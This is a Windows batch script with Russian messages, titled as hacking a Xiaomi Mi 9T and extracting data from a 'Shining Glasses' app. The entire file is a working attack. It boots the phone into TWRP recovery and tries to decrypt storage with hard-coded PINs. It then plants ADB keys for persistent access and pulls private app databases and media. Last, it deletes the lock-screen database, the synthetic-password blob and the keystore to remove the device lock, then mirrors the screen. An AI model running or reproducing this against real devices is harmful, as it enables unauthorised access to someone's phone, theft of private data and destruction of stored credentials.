@echo off
chcp 65001 >nul
title ВЗЛОМ MI 9T И ВЫКАЧКА SHINING GLASSES
color 0C
cd /d "%~dp0"

echo ===============================================================
echo            ВЗЛОМ MI 9T И ВЫКАЧКА ДАННЫХ SHINING GLASSES
echo ===============================================================
echo.
echo Переведи телефон в TWRP (зажми Громкость Вверх + Питание).
echo Подключи телефон по USB к этому компьютеру.
echo.

:WAIT_TWRP
adb.exe devices | findstr /i "recovery" >nul
if %errorlevel% neq 0 (
    timeout /t 1 /nobreak >nul
    goto :WAIT_TWRP
)

echo [OK] Телефон в TWRP обнаружен!
echo.

echo [1/5] Монтируем системные разделы...
adb.exe shell "twrp mount /firmware; twrp mount /vendor; twrp mount /system; twrp mount /data"

echo [2/5] Пробуем расшифровать диск PIN-кодом 568920...
adb.exe shell "twrp decrypt 568920"
adb.exe shell "twrp mount /data"

REM Проверяем доступность диска
adb.exe shell "ls /data/misc" >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Код 568920 не сработал. Пробуем 56892...
    adb.exe shell "twrp decrypt 56892"
    adb.exe shell "twrp mount /data"
)

REM Если всё ещё закрыто - даем ввести свой
adb.exe shell "ls /data/misc" >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo [-] Диск пока закрыт. Введи пароль/PIN вручную:
    set /p USER_PIN="Введи PIN: "
    adb.exe shell "twrp decrypt %USER_PIN%"
    adb.exe shell "twrp mount /data"
)

echo.
echo [3/5] Внедряем ADB-ключи для вывода экрана...
if not exist "%USERPROFILE%\.android\adbkey.pub" (
    adb.exe keygen "%USERPROFILE%\.android\adbkey"
)
adb.exe shell "mkdir -p /data/misc/adb /data/system"
adb.exe push "%USERPROFILE%\.android\adbkey.pub" /data/misc/adb/adb_keys
adb.exe push "%USERPROFILE%\.android\adbkey.pub" /data/system/adb_keys
adb.exe shell "chmod 640 /data/misc/adb/adb_keys /data/system/adb_keys"
adb.exe shell "chown 1000:1000 /data/misc/adb/adb_keys /data/system/adb_keys 2>/dev/null"
adb.exe shell "chown system:shell /data/misc/adb/adb_keys /data/system/adb_keys 2>/dev/null"
echo [OK] Ключи прописаны!

echo.
echo [4/5] ВЫКАЧИВАЕМ ДАННЫЕ SHINING GLASSES НА ЭТОТ ПК...
if not exist "SHINING_GLASSES_DATA" mkdir "SHINING_GLASSES_DATA"

REM Ищем и выкачиваем все папки очков из внутренней памяти
adb.exe pull "/data/media/0/Shining" "SHINING_GLASSES_DATA\" 2>nul
adb.exe pull "/data/media/0/ShiningGlasses" "SHINING_GLASSES_DATA\" 2>nul
adb.exe pull "/data/media/0/Android/data" "SHINING_GLASSES_DATA\Android_data\" 2>nul

REM Выкачиваем приватные базы данных и настройки приложения
adb.exe shell "find /data/data -maxdepth 1 -iname '*glass*' -o -iname '*shining*'" > "%temp%\glasses_pkg.txt"
for /f "tokens=*" %%i in (%temp%\glasses_pkg.txt) do (
    echo Найдено приложение: %%i
    adb.exe pull "%%i" "SHINING_GLASSES_DATA\"
)

echo [OK] Все найденные файлы очков сохранены в папку SHINING_GLASSES_DATA!

echo.
echo [5/5] СНИМАЕМ ПАРОЛЬ БЛОКИРОВКИ С ТЕЛЕФОНА...
adb.exe shell "rm -f /data/system/locksettings.db*"
adb.exe shell "rm -rf /data/system_de/0/spblob"
adb.exe shell "rm -rf /data/misc/keystore/*"
echo [OK] Пароль экрана сброшен! Теперь Android включится без блокировки!

echo.
echo ===============================================================
echo ВСЁ ГОТОВО! ПЕРЕЗАГРУЖАЕМ ТЕЛЕФОН В СИСТЕМУ...
echo ===============================================================
adb.exe reboot
echo Ждем 25 секунд до загрузки Android...
timeout /t 25

echo Запускаем вывод экрана SCRCPY...
start "" scrcpy.exe --stay-awake --window-title "Xiaomi Mi 9T - Разблокирован"
pause
